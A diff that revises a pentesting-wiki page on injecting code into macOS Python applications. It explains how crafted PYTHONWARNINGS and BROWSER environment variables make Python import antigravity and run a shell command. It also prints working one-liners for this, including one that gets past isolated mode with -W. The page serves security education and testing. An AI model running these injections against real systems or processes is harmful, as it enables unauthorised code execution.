@@ -1,19 +1,19 @@
-# macOS Python Applications Injection
+# macOS Python Application Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Via `PYTHONWARNINGS` and `BROWSER` env variables
+## Via the `PYTHONWARNINGS` and `BROWSER` environment variables
 
-It's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:<sup>[[1]](#references)</sup>
+If an attacker can control a Python process's environment, the combination of `PYTHONWARNINGS` and `BROWSER` can trigger command execution when Python imports the `antigravity` module while processing a crafted warning option. The technique relies on `antigravity` opening a URL with Python's `webbrowser` module, which honors the `BROWSER` environment variable.<sup>[[1]](#references)</sup>
 
 ```bash
-# Generate example python script
+# Generate an example Python script.
 echo "print('hi')" > /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks
+# Create /tmp/hacktricks through the inherited environment.
 PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
+# With isolated mode, inject the warning rule using -W instead.
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
 
